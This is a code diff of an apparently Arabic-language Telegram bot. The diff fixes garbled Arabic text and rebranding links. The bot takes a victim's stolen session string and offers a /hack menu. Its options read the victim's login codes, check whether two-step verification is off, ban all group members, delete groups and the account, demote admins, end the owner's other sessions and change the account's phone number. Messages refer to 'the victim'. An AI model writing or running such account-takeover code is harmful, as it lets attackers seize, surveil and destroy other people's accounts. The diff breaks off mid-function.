@@ -284,36 +284,35 @@ logging.basicConfig(level=logging.WARNING)
 channel = "jepthon"
 menu = '''
 
-"A" :~ [Ù…Ø¹Ø±ÙÙ‡ Ù‚Ù†ÙˆØ§Øª/ÙƒØ±ÙˆØ¨Ø§Øª Ø§Ù„ØªÙŠ ÙŠÙ…Ù„ÙƒÙ‡Ø§]
+"A" :~ [معرفه قنوات/كروبات التي يملكها]
 
-"B" :~ [Ø¬Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø«Ù„ {Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ ØŒ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ùˆ Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø®Øµ... ]
+"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
 
-"C" :~ [{ØªÙÙ„ÙŠØ´ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡ {Ø§Ø¹Ø·Ù†ÙŠ Ø§Ù„ÙƒÙˆØ¯ Ùˆ Ø¨Ø¹Ø¯Ù‡Ø§ Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙŠÙˆØ²Ø± Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡ Ùˆ Ø³Ø§Ø·Ø±Ø¯ Ø¬Ù…ÙŠØ¹ Ø§Ø¹Ø¶Ø§Ø¡]
+"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
 
-"D" :~ [Ø¬Ù„Ø¨ Ø§Ø®Ø± Ø±Ø³Ø§Ù„Ù‡ ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù‰ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]
+"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
 
-"E" :~ [Ø§Ù†Ø¶Ù…Ø§Ù… Ø§Ù„Ù‰ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡ Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³] 
+"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
 
-"F" :~ [Ù…ØºØ§Ø¯Ø±Ù‡ ÙƒØ±ÙˆØ¨ /Ù‚Ù†Ø§Ù‡ Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]
+"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
 
-"G" :~][Ù…Ø³Ø­ ÙƒØ±ÙˆØ¨ /Ù‚Ù†Ø§Ù‡ Ø¹Ù† Ø¹Ù† Ø·Ø±ÙŠÙ‚ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]
+"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
 
-"H" :~ [ØªØ§ÙƒØ¯ Ù…Ù† Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ† /Ù…ÙØ¹Ù„ Ø§Ùˆ Ù„Ø§]
+"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
 
-"I" :~ [Ø§Ù†Ù‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ø§ Ø¹Ø¯Ø§ Ø¬Ù„Ø³Ø© Ø§Ù„Ø¨ÙˆØª]
+"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
 
-"J" :~ [Ø­Ø°Ù Ø§Ù„Ø­Ø³Ø§Ø¨]
+"J" :~ [حذف الحساب]
 
-"K" :~ [Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø´Ø±ÙÙŠÙ† ÙÙŠ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡]
+"K" :~ [حذف جميع المشرفين في كروب/قناه]
 
-"L" ~ [ØªØ±Ù‚ÙŠÙ‡ Ø¹Ø¶Ùˆ Ø§Ù„Ù‰ Ù…Ø´Ø±Ù Ø¯Ø§Ø®Ù„ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡]
+"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
 
-"M" ~ [ØªØºÙŠØ± Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³]
+"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
-Ø§Ù†ØªØ¶Ø±Ùˆ Ù‚Ø±ÙŠØ¨Ø§ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª ðŸ™‹â€â™‚ï¸
 '''
 mm = '''
-Ù…Ù„Ø§Ø­Ø¸Ù‡ Ø§Ù†Ø¶Ù… Ø§ÙˆÙ„Ø§ Ù„Ù„Ø¯Ø¹Ù… @N_B_10
+قم بلأنضمام الى قناة جيبثون @Jepthon
 '''
 
 keyboard = [
@@ -338,7 +337,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Ø§Ù„Ù…Ø·ÙˆØ±", "https://t.me/jepthon")
+    Button.url("قناة السورس", "https://t.me/jepthon")
     ]
 ]
 
@@ -348,27 +347,27 @@ async def op(event):
   if not event.is_private:
     IndianHack = [
       [
-        Button.url("Ø§Ø¶ØºØ· Ù‡Ù†Ø§", f"https://t.me/{Bot_Username}?start=hack")
+        Button.url("اضغط هنا", f"https://t.me/{Bot_Username}?start=hack")
         ]
       ]         
-    await event.reply("Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…ÙŠ", buttons=Arabihack)
+    await event.reply("اضغط هنا لأستخدامي", buttons=Arabihack)
   else:
     legendbye = [
       [
-        Button.url("Ø¯ÙˆØ³ Ù‡Ù†Ø§", f"https://t.me/N_B_10")
+        Button.url("اضغط هنا", f"https://t.me/jepthon")
         ]
       ]
-    await event.reply("Ø§ÙˆÙ„Ø§ Ø§Ù†Ø¶Ù… Ø§Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ù‡!\n Ø¨Ø¹Ø¯Ù‡Ø§ Ø¬Ø±Ø¨ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰~ /hack", buttons=legendbye)
+    await event.reply("اولاً قم بلأنضمام الى القناة بعدها قم بكتابة /hack", buttons=legendbye)
     
        
 @tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
   IndianHack = [
     [
-      Button.url("Ø¯ÙˆØ³ Ù‡Ù†Ø§", f"https://t.me/{Bot_Username}")
+      Button.url("اضغط هنا", f"https://t.me/{Bot_Username}")
       ]
     ]         
-  await event.reply("Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…ÙŠ", buttons=Arabihack)
+  await event.reply("اضغط هنا لأستخدامي", buttons=Arabihack)
   
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
@@ -396,224 +395,224 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("Ø§Ù„Ù…Ø·ÙˆØ±", "https://t.me/N_B_1")
+        Button.url("المطور", "https://t.me/jepthon")
         ]
     ]
-    await x.send_message(f"Ø§Ø®ØªØ± Ù…Ø§ ØªØ±ÙŠØ¯ ÙØ¹Ù„Ù‡ Ù…Ø¹Ù‡ Ø§Ù„Ø¬Ù„Ø³Ù‡ \n\n{menu}", buttons=keyboard)
+    await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.\n /hack", buttons=keyboard)
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه\n /hack", buttons=keyboard)
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.\n/hack", buttons=keyboard)
+        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @N_B_1")
+        file.write(i + "\n\nDetails BY @Jepthon")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس جيبثون ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+    await x.send_message("الان ارسل الكود تيرمكس")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
       pass
     else:
-      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.\n/hack", buttons=keyboard)
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس جيبثون ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+    await x.send_message("الان ارسل الكود تيرمكس")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
       pass
     else:
-      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§", buttons=keyboard)
-    await x.send_message("Ø§Ø±Ø³Ù„ Ù„ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
+    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
     grpid = await x.get_response()
     await userbans(strses.text, grpid.text)
-    await event.reply("ÙŠØªÙ… Ø­Ø¸Ø± Ø¬Ù…ÙŠØ¹ Ø§Ø¹Ø¶Ø§Ø¡ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡", buttons=keyboard)
+    await event.reply("يتم حظر جميع اعضاء القناة/الكروب", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس جيبثون", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+    await x.send_message("الان ارسل الكود تيرمكس")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
       pass
     else:
-      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-    await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+    await x.send_message("اعطني معرف/ايدي القناة او الكروب")
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
-    await event.reply("ØªÙ… Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø§Ù„Ù‰ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡", buttons=keyboard)
+    await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+    await x.send_message("الان ارسل الكود تيرمكس")
     strses = await x.get_response()
     op = await cu(strses.text)
     if op:
       pass
     else:
-      return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-    await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+    await x.send_message("اعطيني معرف /ايدي الكروب او القناة")
     grpid = await x.get_response()
     await leavegroup(strses.text, grpid.text)
-    await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ù…ØºØ§Ø¯Ø±Ù‡ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡,", buttons=keyboard)
+    await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-      await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("ØªÙ… Ø­Ø°Ù Ø§Ù„ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡ //Ø´ÙƒØ±Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك جيبثون.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await user2fa(strses.text)
       if i:
-        await event.reply("Ø§Ù„Ø´Ø®Øµ Ù„Ù… ÙŠÙØ¹Ù„ ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ† ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù‰ Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨ÙƒÙ„ Ø³Ù‡ÙˆÙ„Ù‡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø§Ù…Ø± ( D ) \n\nØ´ÙƒØ±Ø§ Ù„Ùƒ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.", buttons=keyboard)
+        await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكرا لك لاستخدامك البوت.", buttons=keyboard)
       else:
-        await event.reply("Ø¹Ø°Ø±Ø§ Ø§Ù„Ø´Ø®Øµ Ù…ÙØ¹Ù„ ØªØ­Ù‚Ù‚ Ø¨Ø®Ø·ÙˆØªÙŠÙ†", buttons=keyboard)
+        await event.reply("للأسف الشخص مفعل التحقق بخطوتين", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("ØªÙ… Ø§Ù†Ù‡Ø§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø´ÙƒØ±Ø§ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…Ùƒ Ø§Ù„Ø¨ÙˆØª.", buttons=keyboard)
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك جيبثون.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ø­Ø°Ù Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­.", buttons=keyboard)
+      await event.reply("تم حذف الحساب بنجاح 😈.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-      await x.send_message("Ø§Ø±Ø³Ù„ Ù„ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
       grp = await x.get_response()
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„Ù…Ø¹Ø±Ù")
+      await x.send_message("الان ارسل لي المعرف")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("Ø³Ø§Ø±ÙØ¹Ùƒ ÙÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡ðŸŒš.", buttons=keyboard)
+      await event.reply("سأرفعك في القناة/الكروب 😉.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§.", buttons=keyboard)
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ù…Ø¹Ø±Ù/Ø§ÙŠØ¯ÙŠ Ø§Ù„ÙƒØ±ÙˆØ¨/Ù‚Ù†Ø§Ù‡")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("Ù„Ù‚Ø¯ ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ù…Ø´Ø±ÙÙŠÙ† Ø§Ù„ÙƒØ±ÙˆØ¨/Ø§Ù„Ù‚Ù†Ø§Ù‡.", buttons=keyboard)
+      await event.reply("تم حذف جميع مشرفين الكروب/القناة.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
-      await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ ØªØ±Ù…ÙƒØ³")
+      await x.send_message("الان ارسل الكود تيرمكس")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("Ù„Ù‚Ø¯ ØªÙ… Ø·Ø±Ø¯ Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ Ù…Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³Ø¨Ù‚Ø§", buttons=keyboard)
-      await x.send_message("Ø§Ø¹Ø·Ù†ÙŠ Ø±Ù‚Ù… Ø§Ù„ØªÙŠ ØªØ±ÙŠØ¯ ØªØºÙŠØ± Ø§Ù„ÙŠÙ‡\n[Ù…Ù„Ø§Ø­Ø¸Ù‡ /Ù„Ø§ ØªØ³ØªØ®Ø¯Ù… Ø§Ø±Ù‚Ø§Ù… Ø§Ù„ÙˆÙ‡Ù…ÙŠÙ‡]\n[Ø§Ø°Ø§ Ø§Ø³ØªØ®Ø¯Ù…Øª Ø§Ù„Ø§Ø±Ù‚Ø§Ù… Ø§Ù„ÙˆÙ‡Ù…ÙŠÙ‡ Ù…Ø±Ø§Ø­ ØªÙƒØ¯Ø± ØªØ­ØµÙ„ Ø§Ù„ÙƒÙˆØ¯] ")
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
+      await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
         await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
         await asyncio.sleep(20)
-        await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ ÙƒÙˆØ¯ Ù‡Ø§Ø´")
+        await x.send_message("الان ارسل لي الهاش")
         phone_code_hash = (await x.get_response()).text
-        await x.send_message("Ø§Ù„Ø§Ù† Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„ÙƒÙˆØ¯")
+        await x.send_message("الان ارسل لي الكود")
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("Ù„Ù‚Ø¯ ØªÙ… ØªØºÙŠØ± Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ Ø¨Ù†Ø¬Ø§Ø­")
+          await event.respond("لقد تم تغير الرقم بنجاح ✅")
         else:
-          await event.respond("Ù‡Ù†Ø§Ùƒ Ø®Ø·Ø£ Ù…Ø§ Ø­ØµÙ„")
+          await event.respond("هنالك خطأ ما حصل")
       except Exception as e:
